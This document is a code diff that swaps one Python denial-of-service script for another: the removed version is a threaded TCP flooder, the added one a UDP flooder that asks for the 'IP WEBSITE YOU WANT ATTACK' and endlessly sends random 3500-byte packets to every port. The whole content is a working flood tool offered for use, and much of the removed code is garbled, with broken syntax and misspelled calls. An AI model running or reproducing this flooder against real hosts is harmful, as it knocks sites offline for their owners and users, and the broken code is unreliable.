@@ -1,52 +1,33 @@
-import random
-import threading
 import socket
 import os
+import random
 import time
-from termcolor import colored
-os.system('cls')
 
-def logo():
-  logo = """
-_   _                       _____             _____ 
+white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(3500)
+
+os.system("clear")
+print "_   _                       _____             _____ 
  | \ | |                     |  __ \           / ____|
  |  \| |   __ _   _ __ ___   | |  | |   ___   | (___  
  | . ` |  / _` | | '_ ` _ \  | |  | |  / _ \   \___ \ 
  | |\  | | (_| | | | | | | | | |__| | | (_) |  ____) |
- |_| \_|  \__,_| |_| |_| |_| |_____/   \___/  |_____/
-                               Copyright: Vo Hoang Nam
+ |_| \_|  \__,_| |_| |_| |_| |_____/   \___/  |_____/ "                                                                     "                                                                                                                           "
+print 
+print("\032[32m================================================================\033[0m")
+print("\032[33mGithub 	       : https://github.com/Lozllll/\033[0m")
+print("\032[32m================================================================\033[0m")
+print
 
-"""
-  print (logo)
+ip = raw_input("[+] >>IP WEBSITE YOU WANT ATTACK: ")
+os.system("clear")
+print "ATTACKING....."
+time.sleep(3)
+while True:
+	sent = 0
+	for port in range(1, 65534):
+    		white.sendto(bytes, (ip,port))
+    		sent = sent + 1
+    		print "\032[1;91mSend \032[1;32m%s \032[1;91m Packets to \032[1;32m%s \032[1;91mThrough port \032[1;32m%s "%(sent, ip, port)
 
-ip = str(input(colored("[+] IP: ", 'green')))
-port = int(input(colored ("[+] Port: ", 'green'))) 
-packet = int(input(colored ("[+] Packets: ", "green")))
-thread= int(input(colored ("[+] Threads: ","green"))) time.sleep(1.5)
-
-print(colored(ne time.sleep(2)
-print(colored("\n[+] start...","green")) time.sleep(1)
-print(colored("\n","green")) time.sleep(1)
-print(colored("\n","green")) time.sleep(1)
-print(colored("\n1","green")) tie.sleep(1)
-os.system("cls")
-
-def syn(): 
-hevin = random, urandom(980)
-bb = int(0)
-while True: 
-try: 
-h = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-h.connect((ip,port)) 
-h.send(hevin)
-for i in range(packet):
-h.send(hevin)
-bb += 1
-print(colored('[+] Attacking '+ip +">>>Sent: +str(bb), 
-except KeyboardInterrupt:
-h.close()
-print(colored("[+++] XONG !!!!", 'green')) 
-pass
-for b in range(thread):
-thread - threading.Thread(target=syn)
-thread.start()
+print "\031[1;92mDONE!\031[0m"
